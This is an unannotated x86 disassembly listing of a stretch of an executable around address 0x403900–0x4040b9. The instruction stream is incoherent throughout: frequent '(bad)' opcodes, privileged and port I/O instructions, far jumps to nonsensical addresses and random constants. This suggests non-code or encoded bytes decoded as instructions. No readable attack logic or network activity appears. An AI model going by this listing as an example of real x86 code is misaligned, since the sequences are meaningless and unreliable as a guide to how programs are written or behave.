  40391d:	fst    DWORD PTR [edi-0x1afbbd66]
  403923:	fnsave [edx]
  403925:	or     al,0xc9
  403927:	daa    
  403928:	(bad)  
  403929:	mov    bl,0xed
  40392b:	mov    ebp,0xb2be00dd
  403930:	mov    esp,0xf52ab9b8
  403935:	pop    edi
  403936:	nop
  403937:	dec    edi
  403938:	(bad)  
  403939:	lock pop edi
  40393b:	jge    0x40391b
  40393d:	cli    
  40393e:	and    eax,0x3e4d614
  403943:	push   edi
  403944:	xor    ecx,esp
  403946:	pop    ebp
  403947:	dec    ebp
  403948:	inc    esp
  403949:	cmp    bl,BYTE PTR [edi-0x4df3abaa]
  40394f:	xchg   dl,bh
  403951:	inc    edi
  403952:	jae    0x4038e8
  403954:	push   esp
  403955:	aad    0x77
  403957:	ret    
  403958:	add    bl,BYTE PTR [ebx+0x6b61ab2]
  40395e:	leave  
  40395f:	jnp    0x403922
  403961:	ror    BYTE PTR [ebx-0x4f6a8040],0xd3
  403968:	sbb    DWORD PTR [esi+eiz*8-0x12],edx
  40396c:	dec    esp
  40396d:	hlt    
  40396e:	jecxz  0x403934
  403970:	or     esi,eax
  403972:	imul   ebp,DWORD PTR [eax],0x432af54e
  403978:	mov    edi,0x3ef0b3b9
  40397d:	add    eax,0xa5c97b50
  403982:	mov    ebp,0xd44c19f1
  403987:	sub    DWORD PTR [eax],ebp
  403989:	(bad)  
  40398a:	push   cs
  40398b:	mov    dl,0xb0
  40398d:	and    dl,BYTE PTR [ebx-0x68b4be1d]
  403993:	push   eax
  403994:	push   es
  403995:	stos   BYTE PTR es:[edi],al
  403996:	scas   eax,DWORD PTR es:[edi]
  403997:	or     BYTE PTR [ebp-0x67],0x91
  40399b:	mov    ?,WORD PTR [edx-0x5a]
  40399e:	data16 test al,0x1b
  4039a1:	mov    al,0xfa
  4039a3:	cmp    al,0xf9
  4039a5:	jns    0x4039a2
  4039a7:	shr    ebp,1
  4039a9:	add    ecx,esp
  4039ab:	fwait
  4039ac:	xor    eax,0x56fdf026
  4039b1:	popa   
  4039b2:	imul   ebp,DWORD PTR [edi+0x554d32f3],0xe06731df
  4039bc:	pop    edi
  4039bd:	bnd jl 0x4039f5
  4039c0:	(bad)  
  4039c2:	jp     0x403a06
  4039c4:	outs   dx,BYTE PTR ds:[esi]
  4039c5:	cmp    al,0xfd
  4039c7:	rcl    edi,1
  4039c9:	int    0xd9
  4039cb:	loope  0x40398f
  4039cd:	retf   
  4039ce:	sbb    dh,BYTE PTR ds:0xa1f58be6
  4039d4:	jecxz  0x403a19
  4039d6:	pop    eax
  4039d7:	sub    al,0x35
  4039d9:	lods   eax,DWORD PTR ds:[esi]
  4039da:	adc    BYTE PTR [ebx-0x4225396a],cl
  4039e0:	in     eax,dx
  4039e1:	adc    DWORD PTR [eax+edi*8],edx
  4039e4:	xchg   esi,eax
  4039e5:	jo     0x4039b6
  4039e7:	nop
  4039e8:	pop    edi
  4039e9:	sar    DWORD PTR [ecx+eiz*8-0x61],cl
  4039ed:	call   FWORD PTR [edx]
  4039ef:	out    dx,al
  4039f0:	test   eax,0x29716869
  4039f5:	hlt    
  4039f6:	jbe    0x403a50
  4039f8:	cmp    al,0xc3
  4039fa:	(bad)
  4039fe:	daa    
  4039ff:	not    DWORD PTR [eax+ecx*2-0x41]
  403a03:	adc    dh,dh
  403a05:	(bad)
  403a08:	bound  esp,QWORD PTR [eax-0x7d]
  403a0b:	or     al,0xbd
  403a0d:	xor    DWORD PTR [ebp+0x247fd36f],ecx
  403a13:	call   0xeba94b3f
  403a18:	mov    edi,0xc10a9a9c
  403a1d:	and    al,0x71
  403a1f:	or     al,0x54
  403a21:	mov    ebp,0x2b6a2563
  403a26:	mul    ah
  403a28:	std    
  403a29:	adc    ecx,DWORD PTR [ebx]
  403a2b:	(bad)  
  403a2d:	in     eax,dx
  403a2e:	sbb    eax,0x2ec6ab55
  403a33:	outs   dx,BYTE PTR ds:[esi]
  403a34:	cdq    
  403a35:	dec    ecx
  403a36:	add    DWORD PTR [edx],eax
  403a38:	pop    ecx
  403a39:	ror    DWORD PTR ss:[ebx-0x4e],0x57
  403a3e:	jge    0x4039ce
  403a40:	rol    DWORD PTR [ecx-0x53],1
  403a43:	loope  0x403a15
  403a45:	add    esp,edi
  403a47:	add    ebx,eax
  403a49:	and    eax,esi
  403a4b:	jecxz  0x403a5a
  403a4d:	dec    ebp
  403a4e:	gs pop ds
  403a50:	lahf   
  403a51:	fistp  WORD PTR [edx+eax*8+0x4d]
  403a55:	out    0xd9,eax
  403a57:	div    DWORD PTR [edi+0x262800f6]
  403a5d:	push   ebp
  403a5e:	into   
  403a5f:	ja     0x403a0e
  403a61:	push   esp
  403a62:	(bad)  [ebp-0x113026e6]
  403a68:	adc    eax,0x3a9c41fd
  403a6d:	pop    ss
  403a6e:	mov    ecx,ds
  403a70:	dec    ebp
  403a71:	jns    0x403ac4
  403a73:	mov    dh,0x97
  403a75:	shl    DWORD PTR [eax+0x6c],0x5c
  403a79:	imul   edx,DWORD PTR [edx+0x1a87e4dd],0xd9e8aea3
  403a83:	mov    ?,WORD PTR [edi]
  403a85:	punpckhwd mm6,mm4
  403a88:	in     eax,dx
  403a89:	inc    eax
  403a8a:	mov    ah,0x51
  403a8c:	inc    edi
  403a8d:	cmp    ah,bh
  403a8f:	mov    dh,ah
  403a91:	not    BYTE PTR [edx-0x55]
  403a94:	gs push es
  403a96:	lock test al,0x30
  403a99:	je     0x403a60
  403a9b:	test   DWORD PTR ds:0xf17775f,edi
  403aa1:	fild   WORD PTR [esi+ecx*1+0x1e3c1cb6]
  403aa8:	fldcw  WORD PTR [ebp-0x47]
  403aab:	inc    ebx
  403aac:	xor    DWORD PTR [esi],0x72
  403aaf:	add    bh,dl
  403ab1:	inc    esi
  403ab2:	push   ecx
  403ab3:	aas    
  403ab4:	adc    eax,0xc00442ca
  403ab9:	inc    ecx
  403aba:	pop    edi
  403abb:	push   edi
  403abc:	push   es
  403abd:	outs   dx,BYTE PTR ds:[esi]
  403abe:	in     eax,dx
  403abf:	push   0xe4ae2c67
  403ac4:	and    ch,BYTE PTR [edx]
  403ac6:	pop    edi
  403ac7:	cmp    bl,BYTE PTR [ebx+0x4b]
  403aca:	daa    
  403acb:	in     eax,0xba
  403acd:	or     eax,0x3a939646
  403ad2:	dec    eax
  403ad3:	rol    BYTE PTR [esi*1-0x5e4a7a01],0x6b
  403adb:	in     al,0x9c
  403add:	jmp    0xceb61ce6
  403ae2:	lods   eax,DWORD PTR ds:[esi]
  403ae3:	mov    DWORD PTR [eax],eax
  403ae5:	and    ebp,DWORD PTR [edx-0x2]
  403ae8:	jmp    0x1335:0x985343f1
  403aef:	adc    eax,DWORD PTR [esi+0x7512e7d6]
  403af5:	xchg   BYTE PTR [ecx-0x41],ch
  403af8:	lea    eax,[esp+eax*8-0x5]
  403afc:	aas    
  403afd:	xor    al,0x8
  403aff:	inc    ebp
  403b00:	and    esp,DWORD PTR [esi+0x188e09a5]
  403b06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b07:	in     al,0x11
  403b09:	mov    ch,0xde
  403b0b:	nop
  403b0c:	shl    BYTE PTR [eax],0xbd
  403b0f:	xchg   BYTE PTR [ebx-0x26],bh
  403b12:	pop    edi
  403b13:	add    ah,bl
  403b15:	sub    DWORD PTR [edi+0x56],0xffffffdd
  403b19:	dec    ebp
  403b1a:	in     eax,dx
  403b1b:	xor    dl,BYTE PTR [eax-0x1c31a583]
  403b21:	iret   
  403b22:	ficom  DWORD PTR [eax+0x18]
  403b25:	ret    
  403b26:	cs popa 
  403b28:	pop    eax
  403b29:	shr    ebx,cl
  403b2b:	cli    
  403b2c:	into   
  403b2d:	aam    0xb7
  403b2f:	repz aaa 
  403b31:	mov    al,0xdc
  403b33:	pop    ebx
  403b34:	cmp    DWORD PTR [ecx],edx
  403b36:	push   edi
  403b37:	jns    0x403b7e
  403b39:	dec    ebp
  403b3a:	sti    
  403b3b:	dec    eax
  403b3c:	mov    dl,0x66
  403b3e:	adc    BYTE PTR [esi-0x79],bh
  403b41:	or     esi,esi
  403b43:	scas   al,BYTE PTR es:[edi]
  403b44:	push   eax
  403b45:	xlat   BYTE PTR ds:[ebx]
  403b46:	pop    es
  403b47:	mov    ah,0x81
  403b49:	shl    ecx,1
  403b4b:	lods   al,BYTE PTR ds:[esi]
  403b4c:	mov    dh,0x1f
  403b4e:	mov    ecx,0x5c32cd1c
  403b53:	sbb    esp,DWORD PTR [edx+0x7d]
  403b56:	xor    al,0xa3
  403b58:	int3   
  403b59:	daa    
  403b5a:	push   ebx
  403b5b:	push   eax
  403b5c:	xchg   edi,eax
  403b5d:	lds    ebx,FWORD PTR ds:0xbe5f99f2
  403b63:	mov    ebp,0xf373b51d
  403b68:	and    BYTE PTR [edi+0x11b91306],0xf0
  403b6f:	pop    ds
  403b70:	mov    esp,0x98c3a9e5
  403b75:	out    dx,eax
  403b76:	cli    
  403b77:	(bad)  [esi-0x3e]
  403b7a:	lods   eax,DWORD PTR ds:[esi]
  403b7b:	add    BYTE PTR ds:0x83a6481a,bl
  403b81:	mov    ah,0x2c
  403b83:	or     DWORD PTR [eax+0x5d43053d],ebx
  403b89:	push   ss
  403b8a:	sbb    edi,0x46
  403b8d:	inc    esp
  403b8e:	(bad)  
  403b90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b91:	push   esi
  403b92:	mov    ebx,DWORD PTR [ecx]
  403b94:	and    al,0xe0
  403b96:	and    DWORD PTR [edi-0x48],eax
  403b99:	sbb    eax,0x8c6f2fad
  403b9e:	cmp    DWORD PTR [ecx-0x46],0xe7d27466
  403ba5:	aam    0xf6
  403ba7:	ret    0xa4a1
  403baa:	dec    esp
  403bab:	jecxz  0x403b69
  403bad:	jmp    0x403b7c
  403baf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bb0:	cmp    ebp,ebp
  403bb2:	pop    esp
  403bb3:	pushf  
  403bb4:	retf   
  403bb5:	push   es
  403bb6:	cwde   
  403bb7:	popa   
  403bb8:	lods   al,BYTE PTR ds:[esi]
  403bb9:	rcr    DWORD PTR [ebx-0x174d2689],cl
  403bbf:	inc    ebx
  403bc0:	sbb    al,0x96
  403bc2:	stos   DWORD PTR es:[edi],eax
  403bc3:	jne    0x403b6d
  403bc5:	sbb    eax,0x72150a1e
  403bca:	or     BYTE PTR [ecx],al
  403bcc:	xchg   dl,dh
  403bce:	jmp    0x6f65:0x770438e
  403bd5:	test   eax,0x856fc623
  403bda:	dec    esi
  403bdb:	pop    esi
  403bdc:	pop    esi
  403bdd:	aad    0xd6
  403bdf:	mov    dl,0x25
  403be1:	int    0x8
  403be3:	daa    
  403be4:	fcmovbe st,st(3)
  403be6:	les    edi,FWORD PTR [esi+0x1c0d907f]
  403bec:	repnz clc 
  403bee:	hlt    
  403bef:	fild   QWORD PTR [esi+esi*8]
  403bf2:	cli    
  403bf3:	or     DWORD PTR [ebp-0x7515272a],ecx
  403bf9:	cmc    
  403bfa:	repz xchg edx,eax
  403bfc:	mov    fs,WORD PTR [edx-0x29d96528]
  403c02:	adc    al,BYTE PTR [eax-0x31]
  403c05:	test   BYTE PTR [ecx-0x2d],bh
  403c08:	sub    ebp,0xb4995e1a
  403c0e:	or     dl,al
  403c10:	jbe    0x403c91
  403c12:	in     eax,0xe8
  403c14:	mov    ecx,0xa7f16204
  403c19:	sub    esp,DWORD PTR [edx]
  403c1b:	ins    DWORD PTR es:[edi],dx
  403c1c:	sub    DWORD PTR [ecx+0x1fd2a232],ebp
  403c22:	fld    DWORD PTR [eax-0x107f8a10]
  403c28:	outs   dx,BYTE PTR ds:[esi]
  403c29:	in     al,dx
  403c2a:	out    0xd8,al
  403c2c:	pop    ecx
  403c2d:	or     DWORD PTR [ebx-0x1f27ec7f],edx
  403c33:	xchg   esi,eax
  403c34:	mov    bl,bh
  403c36:	and    bh,BYTE PTR [edx]
  403c38:	xor    al,0xe
  403c3a:	aaa    
  403c3b:	sub    edx,ebx
  403c3d:	adc    al,BYTE PTR [ebx+0x54]
  403c40:	pop    esi
  403c41:	mov    edx,0x1dc6e7bf
  403c46:	out    dx,al
  403c47:	xor    al,0x8a
  403c49:	dec    eax
  403c4a:	sub    edi,edx
  403c4c:	or     DWORD PTR [esi],0x81be18e2
  403c52:	scas   al,BYTE PTR es:[edi]
  403c53:	cmp    BYTE PTR [esi-0x70],ch
  403c56:	cmp    bh,BYTE PTR [esi+0xd]
  403c59:	xchg   BYTE PTR [edx+0x36],dl
  403c5c:	dec    edx
  403c5d:	out    dx,al
  403c5e:	mov    DWORD PTR [eax+0x68],edi
  403c61:	(bad)  
  403c62:	jo     0x403ca1
  403c64:	(bad)  
  403c65:	pusha  
  403c66:	mov    cl,BYTE PTR ds:0x475e6b57
  403c6c:	jmp    0x403c3d
  403c6e:	int    0xe5
  403c70:	test   al,0x64
  403c72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c73:	push   ecx
  403c74:	cdq    
  403c75:	fimul  WORD PTR [ebp-0x80]
  403c78:	and    eax,0x6d1e47f8
  403c7d:	rcr    BYTE PTR [ebx],1
  403c7f:	jb     0x403c94
  403c81:	push   esi
  403c82:	pop    esp
  403c83:	int3   
  403c84:	arpl   di,si
  403c86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c87:	gs mov edi,0xbb6286ca
  403c8d:	sub    ecx,edi
  403c8f:	call   0xb73ed6cd
  403c94:	in     al,dx
  403c95:	fiadd  WORD PTR [eax-0x63]
  403c98:	int    0x13
  403c9a:	push   ds
  403c9b:	and    al,0xd9
  403c9d:	hlt    
  403c9e:	dec    edx
  403c9f:	xor    esp,DWORD PTR [ebp+ebx*8-0x85be4f6]
  403ca6:	into   
  403ca7:	cmp    esi,edx
  403ca9:	aad    0xe5
  403cab:	shr    BYTE PTR [eax-0x30],1
  403cae:	and    al,0x48
  403cb0:	push   edx
  403cb1:	rol    DWORD PTR [esi+0x33],cl
  403cb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cb5:	imul   edi,DWORD PTR [edi-0x24e10e26],0xffffff96
  403cbc:	shl    DWORD PTR [ebp-0x32c9dc76],0xd3
  403cc3:	leave  
  403cc4:	inc    ecx
  403cc5:	mov    al,0x7c
  403cc7:	mov    dh,0x8
  403cc9:	(bad)  
  403cca:	arpl   WORD PTR [esi],bp
  403ccc:	xchg   ebx,eax
  403ccd:	pusha  
  403cce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ccf:	dec    ecx
  403cd0:	out    dx,al
  403cd1:	xchg   ebx,eax
  403cd2:	das    
  403cd3:	cmc    
  403cd4:	mov    bh,0x2
  403cd6:	or     DWORD PTR [ebp+0x7f],esp
  403cd9:	in     eax,dx
  403cda:	sub    ecx,DWORD PTR [ecx+0x487651fe]
  403ce0:	or     DWORD PTR [eax+0x5390d327],esp
  403ce6:	and    ch,dl
  403ce8:	sbb    dh,bh
  403cea:	xchg   BYTE PTR [eax+0x5555c951],ch
  403cf0:	int    0xd8
  403cf2:	inc    ebx
  403cf3:	cwde   
  403cf4:	(bad)  
  403cf5:	cmc    
  403cf6:	adc    dl,BYTE PTR [eax]
  403cf8:	push   DWORD PTR [ecx]
  403cfa:	push   edi
  403cfb:	call   0xd2da3380
  403d00:	imul   edx
  403d02:	mov    esi,0xb7dc091d
  403d07:	pop    ds
  403d08:	nop
  403d09:	or     al,0xf
  403d0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d0c:	pop    ebx
  403d0d:	in     eax,dx
  403d0e:	inc    esi
  403d0f:	inc    ebp
  403d10:	aam    0xbd
  403d12:	scas   al,BYTE PTR es:[edi]
  403d13:	or     al,0x8b
  403d15:	xchg   ebp,eax
  403d16:	retf   
  403d17:	int3   
  403d18:	cmp    al,0xe0
  403d1a:	mov    eax,ds:0x522f4c92
  403d1f:	pop    eax
  403d20:	dec    ebp
  403d21:	ficomp WORD PTR [ebx+edx*1]
  403d24:	outs   dx,BYTE PTR ds:[esi]
  403d25:	cmp    al,0xd4
  403d27:	ja     0x403d95
  403d29:	push   0x3b
  403d2b:	shl    edi,0x63
  403d2e:	and    al,0xe8
  403d30:	outs   dx,DWORD PTR ds:[esi]
  403d31:	or     esp,edi
  403d33:	add    DWORD PTR [edi],ecx
  403d35:	inc    DWORD PTR [ebp-0x63]
  403d38:	jo     0x403cba
  403d3a:	loop   0x403d0f
  403d3c:	and    al,0x56
  403d3e:	cdq    
  403d3f:	inc    edi
  403d40:	or     edi,DWORD PTR [ecx+0x29]
  403d43:	inc    ebp
  403d44:	jno    0x403d4d
  403d46:	mov    cs,WORD PTR ds:0x13d1a1c9
  403d4c:	adc    al,0x65
  403d4e:	rcl    edx,cl
  403d50:	hlt    
  403d51:	xor    al,0x3b
  403d53:	sub    eax,0xcfdbaa92
  403d58:	mov    BYTE PTR [edx],ch
  403d5a:	mov    esp,0xa7f964dd
  403d5f:	ror    DWORD PTR [edx],1
  403d61:	daa    
  403d62:	push   edx
  403d63:	jl     0x403ddf
  403d65:	add    al,0xf5
  403d67:	add    eax,0x682d2e88
  403d6c:	or     cl,al
  403d6e:	adc    DWORD PTR [eax-0x6f],ebx
  403d71:	adc    DWORD PTR [ebp+ecx*2+0x4a],0xfffffff6
  403d76:	jbe    0x403d10
  403d78:	clc    
  403d79:	dec    esi
  403d7b:	xor    cl,BYTE PTR [edx+0x42]
  403d7e:	es push ebp
  403d80:	push   0x62
  403d82:	add    BYTE PTR [ebx+eiz*8-0x31],bh
  403d86:	mov    edx,0x9b30c922
  403d8b:	outs   dx,DWORD PTR es:[esi]
  403d8d:	xchg   ecx,eax
  403d8e:	mov    edi,DWORD PTR [ecx-0x47f8f4fc]
  403d94:	shr    DWORD PTR [ebx-0x7cf7a789],1
  403d9a:	pop    eax
  403d9b:	cmp    esi,DWORD PTR [ebp-0x257a399b]
  403da1:	xor    DWORD PTR [ecx-0x2c],0x5f
  403da5:	mov    eax,ds:0xb7176647
  403dab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403dac:	sbb    DWORD PTR [eax-0x830fe5f],eax
  403db2:	enter  0x6238,0xc8
  403db6:	iret   
  403db7:	sub    al,0x3b
  403db9:	ins    BYTE PTR es:[edi],dx
  403dba:	fsubr  QWORD PTR [eax]
  403dbc:	repnz adc ebx,DWORD PTR [ecx+eiz*2]
  403dc0:	fs jnp 0x403e0e
  403dc3:	aam    0xa6
  403dc5:	dec    esi
  403dc6:	mov    ds:0xfc1ecf58,eax
  403dcb:	scas   al,BYTE PTR es:[edi]
  403dcc:	xor    BYTE PTR [ebx-0x36c2c6c7],bh
  403dd2:	sbb    BYTE PTR [ebx+0x8291f3b],dl
  403dd8:	mov    ecx,0x64ab44c
  403ddd:	call   0x9220:0x5a1b5c21
  403de4:	mov    ds:0xcdc1446c,al
  403de9:	(bad)  
  403dea:	(bad)  
  403deb:	retf   
  403dec:	enter  0x3288,0x9b
  403df0:	or     eax,0x9040cc0a
  403df5:	inc    edx
  403df6:	pushf  
  403df7:	(bad)  
  403df8:	lock icebp 
  403dfa:	inc    ebx
  403dfb:	mov    ds,WORD PTR [edi-0x5]
  403dfe:	xor    DWORD PTR [eax],eax
  403e00:	retf   
  403e01:	push   0x658cee2c
  403e06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e07:	pop    ds
  403e08:	pop    ecx
  403e09:	lds    edx,FWORD PTR [eax+0x1d366bcd]
  403e0f:	imul   edx,edi,0x77c57031
  403e15:	retf   
  403e16:	cmc    
  403e17:	rcl    DWORD PTR [ecx+0x47e24135],1
  403e1d:	out    0x95,eax
  403e1f:	push   edx
  403e20:	mov    bh,0x86
  403e22:	jns    0xc1791b12
  403e28:	xor    ebp,DWORD PTR [esi+0x62]
  403e2b:	jmp    0x403e5a
  403e2d:	jge    0x403ddb
  403e2f:	rcr    eax,1
  403e31:	outs   dx,DWORD PTR ds:[esi]
  403e32:	jae    0x403e42
  403e34:	inc    esi
  403e35:	add    al,0xd6
  403e37:	outs   dx,DWORD PTR ds:[esi]
  403e38:	sbb    DWORD PTR [eax-0x57e8aa62],edx
  403e3e:	pop    es
  403e3f:	sub    ebp,edi
  403e41:	mov    bl,0x25
  403e43:	lods   al,BYTE PTR ds:[esi]
  403e44:	inc    ebp
  403e45:	dec    eax
  403e46:	xchg   DWORD PTR [edi+0x475f9b40],eax
  403e4c:	pop    ds
  403e4d:	jle    0x403e8a
  403e4f:	popa   
  403e50:	fistp  WORD PTR [ecx+0x37c58f23]
  403e56:	outs   dx,BYTE PTR ds:[esi]
  403e57:	mov    al,ds:0x66a59a3d
  403e5c:	nop
  403e5d:	fist   DWORD PTR [ecx-0x1b]
  403e60:	iret   
  403e61:	push   ss
  403e62:	out    0x88,al
  403e64:	pop    ebp
  403e65:	mov    ds:0xaa29d483,eax
  403e6a:	push   ss
  403e6b:	iret   
  403e6c:	dec    ebp
  403e6d:	sti    
  403e6e:	xor    edi,DWORD PTR [ecx]
  403e70:	icebp  
  403e71:	dec    ebx
  403e72:	jecxz  0x403ed4
  403e74:	inc    ecx
  403e75:	nop
  403e76:	cli    
  403e77:	adc    DWORD PTR ss:[edi+0x1f],0x10
  403e7c:	test   eax,eax
  403e7e:	(bad)  [edi+0x41]
  403e81:	pop    ecx
  403e82:	dec    ebx
  403e83:	cmp    eax,0xf769f995
  403e88:	xor    BYTE PTR [edx-0x66a1c3e0],0x2b
  403e8f:	ret    0xea61
  403e92:	ins    BYTE PTR es:[edi],dx
  403e93:	pop    ecx
  403e94:	and    esp,ebx
  403e96:	inc    esp
  403e97:	sub    dl,ch
  403e99:	jbe    0x403ea5
  403e9b:	sti    
  403e9c:	push   edi
  403e9d:	jg     0x403ec2
  403e9f:	loop   0x403f1e
  403ea1:	cdq    
  403ea2:	daa    
  403ea3:	aad    0x6c
  403ea5:	inc    edx
  403ea6:	and    dh,BYTE PTR [ecx-0x109c3959]
  403eac:	pop    edx
  403ead:	sbb    cl,al
  403eaf:	mov    ecx,esp
  403eb1:	adc    cl,bl
  403eb3:	add    edi,edx
  403eb5:	dec    ebx
  403eb6:	in     eax,0x95
  403eb8:	jecxz  0x403e7e
  403eba:	fwait
  403ebb:	and    DWORD PTR [ebx+0x71],ebx
  403ebe:	or     cl,ah
  403ec0:	adc    dl,BYTE PTR [ecx+0xc]
  403ec3:	mov    WORD PTR [ecx],?
  403ec5:	pop    ebp
  403ec6:	ins    DWORD PTR es:[edi],dx
  403ec7:	scas   al,BYTE PTR es:[edi]
  403ec8:	jnp    0x403f18
  403eca:	fidiv  WORD PTR [ebx-0xe9e7074]
  403ed0:	mov    ebp,0xa88ed7aa
  403ed5:	jmp    0xd3c7f5ad
  403eda:	and    DWORD PTR [ebp+0x42],eax
  403edd:	adc    ah,BYTE PTR [ebx]
  403edf:	push   es
  403ee0:	push   cs
  403ee1:	push   eax
  403ee2:	xor    edx,edi
  403ee4:	dec    eax
  403ee5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ee6:	sub    cl,bl
  403ee8:	jne    0x403f50
  403eea:	shl    DWORD PTR [edx],1
  403eec:	icebp  
  403eed:	mov    eax,ds:0xee5c37ef
  403ef2:	dec    esi
  403ef3:	dec    ecx
  403ef4:	pop    ss
  403ef5:	dec    esi
  403ef6:	push   cs
  403ef7:	retf   0xe01e
  403efa:	mov    esi,0x87e8ef8f
  403eff:	push   ecx
  403f00:	int    0x57
  403f02:	pop    edi
  403f03:	fdiv   DWORD PTR [ebp-0x25e50b79]
  403f09:	or     eax,0x489146f0
  403f0e:	scas   eax,DWORD PTR es:[edi]
  403f0f:	push   es
  403f10:	daa    
  403f11:	sbb    BYTE PTR [ebp*2+0x4b8fcaf3],dl
  403f18:	bound  eax,QWORD PTR es:[esi-0x451fe6b9]
  403f1f:	mov    ds:0xff16d58,eax
  403f24:	loop   0x403f5e
  403f26:	out    dx,eax
  403f27:	lods   al,BYTE PTR ds:[esi]
  403f28:	lock push ebp
  403f2a:	stos   BYTE PTR es:[edi],al
  403f2b:	push   0xfffffff0
  403f2d:	(bad)  
  403f2e:	sar    BYTE PTR [esi-0x73],1
  403f31:	neg    dl
  403f33:	jg     0x403ed7
  403f35:	iret   
  403f36:	out    dx,eax
  403f37:	(bad)  
  403f38:	call   FWORD PTR [eax]
  403f3a:	sbb    DWORD PTR [esi+0x12],ebx
  403f3d:	jnp    0x403efc
  403f3f:	fs add al,0x76
  403f42:	rcl    DWORD PTR [esi+0xa],1
  403f45:	dec    eax
  403f46:	add    al,0xef
  403f48:	call   0x4dd326a2
  403f4d:	push   es
  403f4e:	in     al,0x51
  403f50:	pop    es
  403f51:	mov    bl,0x4
  403f53:	pop    es
  403f54:	push   es
  403f55:	xchg   esp,eax
  403f56:	outs   dx,DWORD PTR ds:[esi]
  403f57:	cdq    
  403f58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f59:	sub    ebp,DWORD PTR [esi-0x375a4186]
  403f5f:	pushf  
  403f60:	in     al,dx
  403f61:	mov    BYTE PTR [esi+0x2f03e902],bl
  403f67:	inc    esi
  403f68:	cmp    ecx,edx
  403f6a:	mov    edi,0x3788370a
  403f6f:	sub    dl,BYTE PTR [eax+0x4e]
  403f72:	in     eax,dx
  403f73:	push   ebx
  403f74:	jl     0x403f0a
  403f76:	lds    ecx,FWORD PTR [edx]
  403f78:	mov    ?,WORD PTR [eax+ebp*4-0x455111aa]
  403f7f:	inc    eax
  403f80:	jg     0x403ffe
  403f82:	ja     0x403f88
  403f84:	jg     0x403fe9
  403f86:	mul    dl
  403f88:	rol    BYTE PTR [ecx+0x2c594d00],1
  403f8e:	inc    esi
  403f8f:	shl    DWORD PTR [ebp-0x444e0e50],0x83
  403f96:	pop    esp
  403f97:	test   eax,esp
  403f99:	das    
  403f9a:	clc    
  403f9b:	xor    DWORD PTR [edx*4+0x5527607f],esp
  403fa2:	mov    edx,0xc51dbc5f
  403fa7:	std    
  403fa8:	mov    edi,0xc97dd367
  403fad:	xchg   edx,eax
  403fae:	(bad)  
  403faf:	sub    eax,0x71c9759d
  403fb4:	pop    ecx
  403fb5:	inc    eax
  403fb6:	ds js  0x403f39
  403fb9:	ss mov esi,0x193184f0
  403fbf:	aam    0xc4
  403fc1:	arpl   WORD PTR [edi-0xbd85b83],cx
  403fc7:	and    BYTE PTR [ecx+0xa],bl
  403fca:	cmc    
  403fcb:	mov    edx,0x21aff73a
  403fd0:	aas    
  403fd1:	mov    ch,0xa3
  403fd3:	loopne 0x403fa6
  403fd5:	add    al,0x98
  403fd7:	pop    eax
  403fd8:	pop    esp
  403fd9:	das    
  403fda:	ficom  WORD PTR [ebx-0x1a425b4b]
  403fe0:	sbb    eax,DWORD PTR [esi]
  403fe2:	rcr    BYTE PTR [ecx+ecx*4],cl
  403fe5:	mov    bl,0x94
  403fe7:	jecxz  0x403f71
  403fe9:	ss pop ss
  403feb:	adc    esi,DWORD PTR [ecx+eax*8-0x5b]
  403fef:	jle    0x404046
  403ff1:	lea    eax,ss:[edx]
  403ff4:	ja     0x403f9c
  403ff6:	mov    ebx,?
  403ff8:	inc    edi
  403ff9:	mov    ebp,0x22e27b21
  403ffe:	mov    eax,ds:0x95d825f3
  404003:	inc    ebp
  404004:	adc    eax,0x1c2aa2a9
  404009:	mov    DWORD PTR [edx],0x6f9e9094
  40400f:	and    BYTE PTR [edi],al
  404011:	mov    bh,0x24
  404013:	cmp    al,0x92
  404015:	fsub   QWORD PTR [esi+0x719cf07c]
  40401b:	mov    esi,0xea024424
  404020:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404021:	dec    edx
  404022:	push   ebx
  404023:	stos   BYTE PTR es:[edi],al
  404024:	or     dh,bh
  404026:	dec    ebx
  404027:	mov    al,0x55
  404029:	xor    edx,DWORD PTR [edx+ebp*8+0x5fe4725c]
  404030:	push   ebx
  404031:	fucom  st(7)
  404033:	in     al,dx
  404034:	jae    0x404061
  404036:	and    BYTE PTR [edx+esi*8],bh
  404039:	test   eax,0xdc36c2c7
  40403e:	and    BYTE PTR [edi+0x5a174db8],0x76
  404045:	xor    DWORD PTR [esi],eax
  404047:	push   ecx
  404048:	inc    BYTE PTR [ebp-0x7]
  40404b:	cdq    
  40404c:	gs es mov ebp,0x88991427
  404053:	call   0x66b2b336
  404058:	fwait
  404059:	pop    edi
  40405a:	push   ebp
  40405b:	inc    eax
  40405c:	inc    ebx
  40405d:	sub    esp,DWORD PTR [esi]
  40405f:	sti    
  404060:	and    DWORD PTR [esi-0x5c932a8b],ebp
  404066:	push   0xffffffcf
  404068:	dec    esi
  404069:	call   0x66d836dd
  40406e:	dec    eax
  40406f:	or     ah,BYTE PTR [edi-0x6b]
  404072:	and    BYTE PTR [esi+0x77],0x70
  404076:	addr16 aam 0x3d
  404079:	jp     0x403ffe
  40407b:	push   es
  40407c:	gs inc edi
  40407e:	xchg   edi,eax
  40407f:	fdiv   DWORD PTR [eax-0xa45cc26]
  404085:	rcl    DWORD PTR [eax],0xa6
  404088:	addr16 aas 
  40408a:	sbb    BYTE PTR [ebx-0x30c3549c],bl
  404090:	and    DWORD PTR [edx],ecx
  404092:	mov    al,BYTE PTR [edi]
  404094:	fmul   DWORD PTR [edi+0x60]
  404097:	fs and esi,0x3c8acfb6
  40409e:	push   ecx
  40409f:	adc    ecx,0xee251844
  4040a5:	mov    bh,0x6
  4040a7:	fidivr DWORD PTR [eax-0x1e]
  4040aa:	cmp    ch,BYTE PTR [edx-0x1423bd77]
  4040b0:	retf   0x8238
  4040b3:	iret   
  4040b4:	aaa    
  4040b5:	jns    0x404069
  4040b7:	adc    al,0xa2
  4040b9:	stc    
